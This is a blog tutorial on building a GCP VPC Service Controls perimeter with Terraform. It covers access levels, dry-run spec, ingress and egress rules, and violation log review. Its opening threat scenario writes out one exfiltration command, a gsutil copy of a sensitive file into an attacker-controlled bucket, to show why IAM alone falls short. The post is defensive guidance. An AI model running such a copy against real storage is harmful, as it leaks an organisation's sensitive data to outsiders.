---
title: 'GCP VPC Service Controls Terraform: data perimeter'
author: Victor Silva
date: 2024-03-11T10:00:00+00:00
layout: post
permalink: /gcp-vpc-service-controls-terraform/
excerpt: "IAM cannot stop a compromised credential from exfiltrating GCS data. Build a GCP VPC Service Controls perimeter with Terraform, including VPC-SC dry run."
categories:
  - GCP
  - Security
tags:
  - GCP
  - VPC Service Controls
  - Terraform
  - Security
  - data perimeter
  - VPC-SC dry run
  - google_access_context_manager_service_perimeter
  - google_access_context_manager_access_level
  - Access Context Manager
  - terraform google provider
---

When someone asks about cloud security on GCP the conversation almost always starts with IAM. Roles, least privilege, workload identity, Org Policy constraints — all solid controls. But IAM has a blind spot that becomes painfully obvious when you think through a specific attack scenario: IAM controls *who can act*, not *where data can go*.

Consider this. A service account with the `storage.objectViewer` role on a sensitive GCS bucket is exactly as privileged as it needs to be. But if that service account is compromised — through a misconfigured workload, a leaked key, or a supply chain attack — an attacker can authenticate as it and run `gsutil cp gs://your-bucket/sensitive-file gs://attacker-controlled-bucket`. The copy operation succeeds. Every single IAM check passes because the identity is valid and the source bucket permissions are correct. The attacker just had to stand up their own GCP project to receive the data.

This is the data exfiltration gap that IAM alone cannot close. AWS addresses a similar problem with Service Control Policies, which let you restrict what API calls member accounts can make regardless of the resource-level permissions granted. Azure approaches it differently through Private Endpoints and network-level controls tied to specific VNets. GCP's answer is **VPC Service Controls** — a perimeter construct that wraps GCP APIs themselves, so data cannot move across the perimeter boundary even if the credentials are valid.

In this post we will implement VPC Service Controls from scratch using Terraform. We will cover the architecture, build the full resource stack, start in dry-run mode to validate without breaking anything, and then promote to enforcement once we know the perimeter is correct.

## How VPC Service Controls Actually Work

Before writing HCL, the architecture is worth understanding properly because VPC-SC introduces concepts that do not exist in other cloud providers.

VPC Service Controls operates through three nested constructs:

**Access Policy** is a singleton resource at the organization level. You have one. All VPC-SC configuration — access levels and service perimeters — lives inside this policy. If you are working in an organization that already has VPC-SC configured, you will import the existing policy rather than create a new one.

**Access Levels** define conditions under which a principal is considered trusted to cross a perimeter boundary. An access level can evaluate IP ranges, device certificate state, user identity, or a combination of these. An IP-based access level that allows your corporate egress IPs is the most common starting point. Access levels are what you grant principals when you want them to have cross-perimeter access.

**Service Perimeters** are the actual enforcement boundary. A perimeter wraps one or more GCP projects and declares which Google APIs are restricted. Traffic between projects inside the perimeter flows normally. Traffic that crosses the perimeter boundary — a call from outside to a restricted API on a protected project, or a call from inside to an API on a project outside — is blocked unless an ingress or egress rule explicitly permits it.

The flow looks like this:

```
Organization
└── Access Policy (singleton)
    ├── Access Level: corp_ip_allowlist  (IP: 203.0.113.0/24)
    ├── Access Level: device_policy      (corp-managed device)
    └── Service Perimeter: data_perimeter
        ├── Projects: project-A, project-B  (by number)
        ├── Restricted APIs: storage, bigquery
        ├── Ingress rules: who can enter and do what
        └── Egress rules: what can leave and where
```

One detail that catches people the first time: the `resources` field in a service perimeter takes project **numbers**, not project IDs. A project ID is the human-readable name like `my-data-project`. The number is the numeric identifier like `123456789012`. They are not interchangeable in the VPC-SC API. In Terraform, you pull the number via a `google_project` data source, which we will see shortly.

### Private Google Access and restricted.googleapis.com

If your workloads run on GCE or GKE instances using Private Google Access — meaning they route GCP API calls internally without a public IP — you have two virtual IP ranges to choose from:

- `private.googleapis.com` (199.36.153.8/30) — serves all Google APIs, ignores VPC-SC perimeters. A VM using this range can call any GCP API regardless of perimeter enforcement.
- `restricted.googleapis.com` (199.36.153.4/30) — serves only VPC-SC-compatible APIs and enforces perimeter boundaries. A VM using this range cannot accidentally bypass the perimeter.

For any project inside a VPC-SC perimeter, you should route GCP API traffic through `restricted.googleapis.com`. This is a DNS and routing change, not a Terraform VPC-SC change, but it is part of the same security boundary design. Without it, a VM inside your perimeter can reach GCP APIs through the unrestricted path and your perimeter enforcement is incomplete.

## Prerequisites

To follow along you will need:

- Terraform 1.4 or later
- The `google` provider version 4.x or 5.x — `google_access_context_manager_*` resources have been stable since 4.x
- Organization-level IAM permissions: `accesscontextmanager.policies.create`, `accesscontextmanager.accessLevels.create`, `accesscontextmanager.servicePerimeters.create` — the `Access Context Manager Admin` role covers all three
- Your GCP Organization ID (numeric): `gcloud organizations list`
- At least one project to protect, and its project number

Verify your setup:

{% highlight bash %}
terraform version
gcloud auth application-default login
gcloud organizations list
gcloud projects describe YOUR_PROJECT_ID --format="value(projectNumber)"
{% endhighlight %}

One important note on permissions: the Access Context Manager API must be enabled in your organization's admin project and the credentials you use must have organization-level (not project-level) roles. VPC-SC configuration lives at the org level, not the project level. If your Terraform runs with a service account scoped to a single project, it will not have enough permissions to create access policies.

## Implementation

### Part 1 — Provider and Variables

Create `main.tf` with provider configuration:

{% highlight hcl %}
terraform {
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = "~> 5.0"
    }
  }
}

provider "google" {
  project = var.admin_project_id
  region  = var.region
}
{% endhighlight %}

Create `variables.tf`:

{% highlight hcl %}
variable "organization_id" {
  type        = string
  description = "GCP Organization ID (numeric, without 'organizations/' prefix)"
}

variable "admin_project_id" {
  type        = string
  description = "Project ID used for provider authentication"
}

variable "protected_project_id" {
  type        = string
  description = "Project ID to protect inside the service perimeter"
}

variable "region" {
  type    = string
  default = "us-central1"
}

variable "allowed_ip_ranges" {
  type        = list(string)
  description = "Corporate IP ranges allowed to cross the perimeter boundary"
  default     = ["203.0.113.0/24"]
}

variable "logging_project_number" {
  type        = string
  description = "Project number of the centralized logging project (egress target)"
}
{% endhighlight %}

Add a data source to resolve the protected project's number. This is how you avoid hardcoding project numbers in your perimeter configuration:

{% highlight hcl %}
data "google_project" "protected" {
  project_id = var.protected_project_id
}
{% endhighlight %}

### Part 2 — Access Policy

The access policy is the organization-level container for all VPC-SC resources. Create `access_policy.tf`:

{% highlight hcl %}
resource "google_access_context_manager_access_policy" "org_policy" {
  parent = "organizations/${var.organization_id}"
  title  = "Org-level Access Policy"
}
{% endhighlight %}

If your organization already has an access policy (which is likely if you are adding VPC-SC to an existing org), you must import it rather than create a new one. GCP allows only one access policy per organization, and attempting to create a second one will fail.

To import an existing policy:

{% highlight bash %}
POLICY_NAME=$(gcloud access-context-manager policies list \
  --organization=YOUR_ORG_ID \
  --format="value(name)")

terraform import google_access_context_manager_access_policy.org_policy ${POLICY_NAME}
{% endhighlight %}

### Part 3 — Access Level

Access levels define the trust conditions for crossing the perimeter. We will create an IP-based access level that trusts traffic from your corporate IP ranges. Create `access_levels.tf`:

{% highlight hcl %}
resource "google_access_context_manager_access_level" "corp_ip" {
  parent = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}"
  name   = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}/accessLevels/corp_ip_allowlist"
  title  = "Corporate IP Allowlist"

  basic {
    conditions {
      ip_subnetworks = var.allowed_ip_ranges
    }
  }
}
{% endhighlight %}

The `name` field for access levels and perimeters must include the full resource path, not just a short identifier. The pattern is `accessPolicies/{policy_name}/accessLevels/{level_id}`. Note that `google_access_context_manager_access_policy.org_policy.name` returns just the numeric policy ID (e.g., `123456789`), not the full `accessPolicies/123456789` path — which is why you interpolate it rather than reference a `.id` attribute.

An IP-based access level trusts the network the request comes from, not the device or the user. For highly sensitive data, you should combine this with a device policy access level that checks for corporate-managed certificates. An `AND` condition combining both gives you network location *and* device trust before allowing cross-perimeter access.

### Part 4 — Service Perimeter in Dry-Run Mode

This is the core of the implementation. We start in dry-run mode, which logs what *would* be blocked without actually blocking anything. This is non-negotiable for production systems — promoting directly to enforcement without validating first has caused real outages for teams that discovered they were missing ingress rules for CI/CD pipelines, monitoring agents, or console access.

Create `service_perimeter.tf`:

{% highlight hcl %}
resource "google_access_context_manager_service_perimeter" "data_perimeter" {
  parent = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}"
  name   = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}/servicePerimeters/data_perimeter"
  title  = "Data Protection Perimeter"

  perimeter_type = "PERIMETER_TYPE_REGULAR"

  # Dry-run mode: status{} = enforced (empty), spec{} = evaluated but not enforced
  use_explicit_dry_run_spec = true

  status {
    restricted_services = []  # nothing enforced yet
  }

  spec {
    restricted_services = [
      "storage.googleapis.com",
      "bigquery.googleapis.com",
    ]

    resources = ["projects/${data.google_project.protected.number}"]

    access_levels = [
      google_access_context_manager_access_level.corp_ip.name
    ]

    vpc_accessible_services {
      enable_restriction = true
      allowed_services = [
        "storage.googleapis.com",
        "bigquery.googleapis.com",
      ]
    }

    ingress_policies {
      ingress_from {
        identity_type = "ANY_SERVICE_ACCOUNT"
        sources {
          access_level = google_access_context_manager_access_level.corp_ip.name
        }
      }
      ingress_to {
        resources = ["*"]
        operations {
          service_name = "storage.googleapis.com"
          method_selectors { method = "google.storage.objects.create" }
          method_selectors { method = "google.storage.objects.get" }
        }
      }
    }

    egress_policies {
      egress_from {
        identity_type = "ANY_SERVICE_ACCOUNT"
      }
      egress_to {
        resources = ["projects/${var.logging_project_number}"]
        operations {
          service_name = "logging.googleapis.com"
          method_selectors { method = "*" }
        }
      }
    }
  }

  depends_on = [google_access_context_manager_access_level.corp_ip]
}
{% endhighlight %}

Let's walk through the key decisions here.

`use_explicit_dry_run_spec = true` activates the split between `status{}` (enforced) and `spec{}` (dry-run). With `status.restricted_services = []`, nothing is actually blocked. The `spec{}` block describes the perimeter you intend to enforce — all violations against this configuration are logged with `dryRun = true` in Cloud Logging.

The `vpc_accessible_services` block controls which APIs VMs inside the perimeter can call via Private Google Access. Setting `enable_restriction = true` with the same service list as `restricted_services` ensures that internal VMs cannot call APIs outside the perimeter via the VPC — they are restricted to the same set of services.

The ingress rule allows any service account coming from a corporate IP to perform `create` and `get` operations on GCS within the perimeter. This covers CI/CD pipelines and application service accounts that need to read or write data from outside the perimeter. You would add more `method_selectors` entries or additional `ingress_policies` blocks for other use cases like BigQuery jobs from a data pipeline running in a separate project.

The egress rule allows any service account inside the perimeter to write logs to the centralized logging project. Without this explicit egress rule, log writes from applications in the protected project to an external logging project would be blocked once you promote to enforcement. This is one of the most commonly missed rules during initial perimeter design.

The `depends_on` between the perimeter and the access level is required due to propagation delay. Access Context Manager changes can take up to 30 minutes to fully propagate across GCP's infrastructure. If Terraform tries to create the perimeter concurrently with the access level, the perimeter creation may fail because the access level is not yet visible in the Access Context Manager API. The explicit dependency ensures the access level is fully created and committed before the perimeter resource is applied.

## Terraform Gotchas

A few specific pitfalls are worth calling out explicitly because they are not obvious from the resource documentation.

**Project number versus project ID.** The `resources` field in a service perimeter strictly requires project numbers in the format `"projects/123456789012"`. Project IDs — the human-readable `my-project-name` form — are not accepted and will cause an API error that is easy to misread. Always use a `data "google_project"` source and reference `.number`, never hardcode the project number directly in your HCL.

**Propagation delay.** Access Context Manager changes propagate asynchronously, and the delay can be substantial — up to 30 minutes in some cases. This means `terraform apply` can complete successfully, but the perimeter configuration is not yet active. If you run verification commands immediately after apply, they may not reflect the new state. When testing dry-run log results, wait at least a few minutes after apply before generating test traffic.

**`depends_on` between access levels and perimeters.** Terraform's implicit dependency graph handles most ordering correctly, but the Access Context Manager API has a specific constraint: a perimeter that references an access level requires the access level to be fully propagated before the perimeter can be created or updated. The `depends_on` in the perimeter resource is not just a best practice — it is required to avoid intermittent apply failures.

**Unsupported services.** Not all GCP services support VPC Service Controls. The supported services list is maintained by Google and changes over time as new services are added. Adding an unsupported service to `restricted_services` will cause a Terraform error. Always verify a service is on the supported list before adding it to your perimeter.

**Shared VPC host project.** If your protected project uses a Shared VPC, the host project must be in the same perimeter as the member projects. A member project inside a perimeter with a host project outside will generate violations for every API call that routes through the shared VPC networking. Include both host and member projects in `resources`.

**Console and monitoring access.** When you promote to enforcement, the GCP Console and Cloud Monitoring may lose access to resources inside the perimeter if you are accessing them from an IP that is not covered by an access level. Plan explicit ingress rules for human console access before enforcing — otherwise you may lock yourself out of monitoring the protected project.

## Transitioning from Dry-Run to Enforced

After running in dry-run mode and reviewing Cloud Logging to confirm there are no unexpected violations (or that all violations are accounted for and covered by ingress/egress rules), you promote to enforcement with a configuration change.

Move the content of `spec{}` into `status{}` and remove the dry-run flag:

{% highlight hcl %}
resource "google_access_context_manager_service_perimeter" "data_perimeter" {
  parent = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}"
  name   = "accessPolicies/${google_access_context_manager_access_policy.org_policy.name}/servicePerimeters/data_perimeter"
  title  = "Data Protection Perimeter"

  perimeter_type = "PERIMETER_TYPE_REGULAR"

  # use_explicit_dry_run_spec removed — status{} is now enforced

  status {
    restricted_services = [
      "storage.googleapis.com",
      "bigquery.googleapis.com",
    ]

    resources = ["projects/${data.google_project.protected.number}"]

    access_levels = [
      google_access_context_manager_access_level.corp_ip.name
    ]

    vpc_accessible_services {
      enable_restriction = true
      allowed_services = [
        "storage.googleapis.com",
        "bigquery.googleapis.com",
      ]
    }

    ingress_policies {
      ingress_from {
        identity_type = "ANY_SERVICE_ACCOUNT"
        sources {
          access_level = google_access_context_manager_access_level.corp_ip.name
        }
      }
      ingress_to {
        resources = ["*"]
        operations {
          service_name = "storage.googleapis.com"
          method_selectors { method = "google.storage.objects.create" }
          method_selectors { method = "google.storage.objects.get" }
        }
      }
    }

    egress_policies {
      egress_from {
        identity_type = "ANY_SERVICE_ACCOUNT"
      }
      egress_to {
        resources = ["projects/${var.logging_project_number}"]
        operations {
          service_name = "logging.googleapis.com"
          method_selectors { method = "*" }
        }
      }
    }
  }

  depends_on = [google_access_context_manager_access_level.corp_ip]
}
{% endhighlight %}

After `terraform apply` with this change, the perimeter is enforced. Any call to `storage.googleapis.com` or `bigquery.googleapis.com` that crosses the perimeter boundary without matching an access level or ingress/egress rule will receive a `403` with the message: `Request violates VPC Service Controls.`

## Testing and Validation

### Checking Dry-Run Violations in Cloud Logging

While in dry-run mode, violations are logged to Cloud Audit Logs with a specific metadata type. In the GCP Console, open Cloud Logging and use this query:

{% highlight text %}
protoPayload.metadata.@type:"type.googleapis.com/google.cloud.audit.VpcServiceControlAuditMetadata"
protoPayload.metadata.dryRun=true
{% endhighlight %}

Each log entry contains fields that tell you exactly why the request would have been blocked:

- `metadata.dryRun` — `true` for dry-run violations, absent for enforced violations
- `metadata.violationReason` — the specific reason: `RESOURCE_NOT_IN_SAME_SERVICE_PERIMETER` (the source or destination project is not inside the perimeter), `NO_MATCHING_ACCESS_LEVEL` (the caller's IP or device does not match any access level), or `CUSTOMER_RESTRICTION_VIOLATION` (the call violates an ingress/egress rule)
- `metadata.vpcServiceControlsUniqueId` — a unique ID per violation event, useful for correlating entries when the same call appears in multiple log sinks
- `serviceName` and `methodName` — which API and method was called, so you can trace it back to the application making the request

This information is what you use to build out your ingress and egress rules during the dry-run phase. Every `NO_MATCHING_ACCESS_LEVEL` violation from a CI/CD system's service account is a potential ingress rule you need to add. Every `RESOURCE_NOT_IN_SAME_SERVICE_PERIMETER` on a log write call is a potential egress rule.

Once you promote to enforcement, remove the `dryRun=true` filter to see actual blocked requests.

### Verifying with gcloud

After the configuration propagates, verify the perimeter state using the `gcloud` CLI:

{% highlight bash %}
export POLICY_ID=$(gcloud access-context-manager policies list \
  --organization=ORGANIZATION_ID \
  --format="value(name)")

gcloud access-context-manager perimeters describe data_perimeter \
  --policy=$POLICY_ID \
  --format=yaml
{% endhighlight %}

This returns the full perimeter configuration as YAML, including both `status` and `spec` blocks if you are still in dry-run mode. Confirm that `restrictedServices` contains the expected services and that `resources` lists the correct project numbers.

To test access from a corporate IP (should succeed after enforcement):

{% highlight bash %}
gcloud storage ls gs://BUCKET_IN_PROTECTED_PROJECT
{% endhighlight %}

To simulate a request from outside the perimeter boundary, you can use Cloud Shell (which originates from Google's IP space, not your corporate range) or any machine not in your `allowed_ip_ranges`:

{% highlight bash %}
# From a machine outside the allowed IP ranges — expect 403
gcloud storage ls gs://BUCKET_IN_PROTECTED_PROJECT
# ERROR: (gcloud.storage.ls) HTTPError 403: Request violates VPC Service Controls.
{% endhighlight %}

The `403` with that specific message confirms the perimeter is enforcing correctly and the data exfiltration path is closed.

## Best Practices

**Always start with dry-run and stay there for at least a week.** One week of production traffic through the dry-run perimeter is usually enough to surface missing ingress rules from scheduled jobs, monitoring agents, and third-party integrations that run on varying schedules. Promoting to enforcement after only a day is how teams discover their weekly backup job is now blocked.

**Use `data.google_project` for every project number.** Never hardcode project numbers as strings in your HCL. Project numbers are opaque and do not self-document which project they belong to. Using `data.google_project.name.number` keeps the intent readable and prevents copy-paste errors across perimeter configurations.

**Scope ingress rules tightly.** The example ingress rule uses `identity_type = "ANY_SERVICE_ACCOUNT"` for clarity, but in production you should specify the exact service account identities for each ingress rule. An overly broad rule that allows all service accounts from a corporate IP is better than no rule, but it still allows any compromised service account on that IP range to move data in. Identity-specific rules limit blast radius.

**Model your perimeter boundaries around data sensitivity, not project boundaries.** A single perimeter that wraps all your projects is simpler to manage but creates a larger blast radius. A perimeter that wraps only your data tier (GCS, BigQuery, Cloud SQL) while leaving compute and networking outside is more precise and generates fewer ingress/egress rule exceptions. Design the boundary around what data you are protecting, then work backwards to the projects that hold it.

**Pair IP access levels with device policy for sensitive data.** An IP access level trusts the network, not the principal or device. A compromised credential on a corporate network still has cross-perimeter access. For workloads touching regulated data, combine the IP condition with a device policy access level that checks for certificate-based device enrollment. The `AND` combination requires both conditions to be satisfied.

**Include the host project in Shared VPC setups explicitly.** Forgetting the Shared VPC host project is one of the most common causes of unexpected violations after enforcement. Check your project hierarchy before defining the `resources` list and include both host and all member projects that need access to the restricted services.

## Conclusion

IAM is necessary but not sufficient for data protection on GCP. The scenario we opened with — a compromised service account copying data to an attacker-controlled project — bypasses IAM cleanly because the identity and permissions are valid. VPC Service Controls closes this gap by making the perimeter boundary independent of credential validity: even a legitimately authenticated service account cannot move data across the perimeter unless the traffic pattern matches an explicit ingress or egress rule.

The Terraform stack we built here gives you a complete, reproducible implementation: access policy, IP-based access level, service perimeter with dry-run first, ingress rules for CI/CD and application access, and egress rules for centralized logging. The dry-run to enforcement transition is a one-step configuration change once you have validated that your violation log is clean or fully accounted for.

From here, the natural next steps are adding a device policy access level for human console access, expanding the `restricted_services` list as you audit which GCP APIs your protected projects use, and automating the violation log review with a Cloud Function that parses `violationReason` and files Jira tickets for missing rules. Each dry-run violation is actionable information — treat it as a security gap to close, not noise to ignore.

For broader GCP security posture, [Security Command Center with Cloud Functions](/gcp-security-command-center-cloud-functions/) gives you automated alerting on findings across your entire organization — a natural complement to the perimeter controls built here. If you are also evaluating Kubernetes admission controls to enforce policy at the workload level, [OPA and Rego admission controller policies](/opa-rego-admission-controller-policy/) covers that layer. And if you are scanning your Terraform for misconfigurations before the perimeter configuration ever reaches `terraform apply`, [Trivy for container and IaC scanning in GitHub Actions](/trivy-github-actions-container-iac-scanning/) shows how to wire that into CI.

Happy scripting!
